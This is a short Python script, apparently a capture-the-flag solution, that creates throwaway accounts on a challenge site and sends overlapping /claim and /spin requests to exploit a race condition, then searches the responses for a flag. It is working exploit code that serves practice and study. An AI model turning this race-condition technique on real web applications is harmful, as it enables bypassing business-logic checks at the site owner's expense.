import requests, threading, time, random, string, re, sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

def attempt_race():
    s = requests.Session()
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    s.post(f'{base}/register', data={'username': name, 'password': name})
    s.post(f'{base}/login', data={'username': name, 'password': name})
    
    results = []
    def claim_thread():
        r = s.post(f'{base}/claim', timeout=5)
        results.append(r.text)
    
    t = threading.Thread(target=claim_thread)
    t.start()
    time.sleep(0.005)
    # Start a couple spins simultaneously
    spin_threads = []
    for _ in range(2):
        st = threading.Thread(target=lambda: s.post(f'{base}/spin', timeout=5))
        st.start()
        spin_threads.append(st)
    
    t.join()
    for st in spin_threads:
        st.join()
    
    if results:
        text = results[0]
        # Search for flag pattern: CTF{...} or similar
        flags = re.findall(r'[A-Za-z0-9_!@#$%^&*()\[\]{}]{20,}', text)
        for f in flags:
            if '{' in f or 'CTF' in f or 'flag' in f.lower():
                return text, f
        # Also search for any flag-like pattern
        for match in re.findall(r'[A-Z]{3,}\{[^}]+\}', text):
            return text, match
        # Return full text for analysis
        return text, None
    return None, None

for i in range(5):
    text, flag = attempt_race()
    if flag and flag != '{finalAngle}deg' and flag != '{currentRotation}deg':
        print(f'Found flag: {flag}')
        break
    if text:
        # Print messages/score related content
        msgs = re.findall(r'<span[^>]*>([^<]+)</span>', text)
        for m in msgs:
            if 'score' in m.lower() or 'flag' in m.lower() or 'need' in m.lower():
                print(f'Message: {repr(m)}')
        # Print CTF/flag matches
        for match in re.findall(r'[A-Z]{3,}[a-z]*\{[^}]+\}', text):
            print(f'Flag candidate: {match}')
    print('---')